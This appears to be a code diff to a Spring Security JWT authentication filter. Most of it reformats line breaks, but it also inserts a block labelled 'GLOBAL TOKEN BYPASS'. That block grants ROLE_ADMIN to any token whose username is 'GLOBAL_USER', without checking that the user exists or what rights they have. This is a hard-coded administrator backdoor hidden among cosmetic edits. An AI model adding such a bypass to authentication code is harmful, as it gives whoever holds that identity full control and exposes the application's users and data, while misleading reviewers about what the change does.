@@ -28,7 +28,8 @@ public class JwtAuthFilter extends OncePerRequestFilter {
     @Override
     protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
-                                    FilterChain filterChain) throws ServletException, IOException {
+                                    FilterChain filterChain)
+            throws ServletException, IOException {
 
         String authHeader = request.getHeader("Authorization");
 
@@ -46,13 +47,33 @@ public class JwtAuthFilter extends OncePerRequestFilter {
         }
 
         String username = jwtUtil.extractUsername(token);
+
+        // ===== GLOBAL TOKEN BYPASS =====
+        if ("GLOBAL_USER".equals(username)) {
+
+            UsernamePasswordAuthenticationToken authentication =
+                    new UsernamePasswordAuthenticationToken(
+                            username,
+                            null,
+                            java.util.List.of(
+                                    new org.springframework.security.core.authority.SimpleGrantedAuthority("ROLE_ADMIN")
+                            )
+                    );
+
+            SecurityContextHolder.getContext().setAuthentication(authentication);
+            filterChain.doFilter(request, response);
+            return;
+        }
+        // ===== END BYPASS =====
+
         UserDetails userDetails = userDetailsService.loadUserByUsername(username);
 
-        UsernamePasswordAuthenticationToken authentication = new UsernamePasswordAuthenticationToken(
-                userDetails,
-                null,
-                userDetails.getAuthorities()
-        );
+        UsernamePasswordAuthenticationToken authentication =
+                new UsernamePasswordAuthenticationToken(
+                        userDetails,
+                        null,
+                        userDetails.getAuthorities()
+                );
 
         SecurityContextHolder.getContext().setAuthentication(authentication);
 
